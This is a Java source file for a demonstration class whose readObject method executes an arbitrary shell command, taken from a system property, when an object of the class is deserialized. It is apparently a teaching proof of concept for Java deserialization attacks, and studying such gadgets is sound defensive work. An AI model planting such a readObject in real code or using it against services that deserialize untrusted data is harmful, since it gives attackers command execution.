package com.example;


import java.io.IOException;

/**
 * This class is a very primitive example of a rogue class that tries to invoke privileged commands during object deserialziation.
 */
public class BadCode implements java.io.Serializable
{
    // let's add a couple of attributes:
    public String name;
    public String address;

    /**
     * This method gets invoked automatically during object deserialization.
     *
     * @param in
     * @throws IOException
     * @throws ClassNotFoundException
     */
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException
    {
        in.defaultReadObject();

        // first we overwrite previous values in these fields.
        this.name = "foo";
        this.address = "fighters!";

        System.out.println("BadCode will now run hacker script");

        // read from system property location of shell script.  It's unlikely this would be avenue taken during real exploit.
        String cmd = System.getProperty( "serial-exploit-sh" );
        String loc = System.getProperty( "user.home" );
        System.out.println("user.home=" + loc);

        // throw runtime exception if -Dserial-exploit-sh system param not set. Of course this would never happen in real attack it's here to make it easier for you to test this code.
        if(cmd == null || cmd.length() == 0)
        {
            throw new RuntimeException( "Must set -Dserial-exploit-sh java system property" );
        }

        // Now execute the script:
        System.out.println("execute hacker command=" + cmd);
        Runtime.getRuntime().exec( cmd );
        System.out.println( "system command has been run.... ");
    }
}